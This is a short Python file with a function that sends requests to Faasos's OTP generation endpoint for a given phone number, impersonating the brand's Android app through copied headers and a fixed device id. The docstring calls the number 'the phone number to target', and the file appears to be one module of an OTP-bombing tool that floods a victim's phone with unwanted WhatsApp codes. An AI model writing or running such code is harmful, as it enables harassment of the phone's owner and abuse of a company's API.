import requests

def run(phone_number):
    """
    Function to handle the OTP API logic for Faasos.

    :param phone_number: The phone number to target.
    """
    try:
        # API URL
        url = "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c"

        # Payload
        payload = {
            "phone_number": phone_number,
            "country_code": "IND",
            "dialing_code": "+91",
            "is_new_customer": True,
            "communication_channel": "whatsapp"
        }

        # Headers
        headers = {
            "Host": "thanos.faasos.io",
            "client-source": "13",
            "brand-id": "8",
            "app-version": "10260",
            "client-os": "behrouz_android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        }

        # Sending the POST request
        response = requests.post(url, json=payload, headers=headers)

        # Handling the response
        if response.status_code == 200:
            print(f"OTP sent successfully to {phone_number}")
            print(f"Response: {response.json()}")
        else:
            print(f"Failed to send OTP to {phone_number}. Status: {response.status_code}, Response: {response.text}")

    except Exception as e:
        # Log any unexpected errors
        print(f"Error while sending OTP to {phone_number}: {e}")

# Example usage

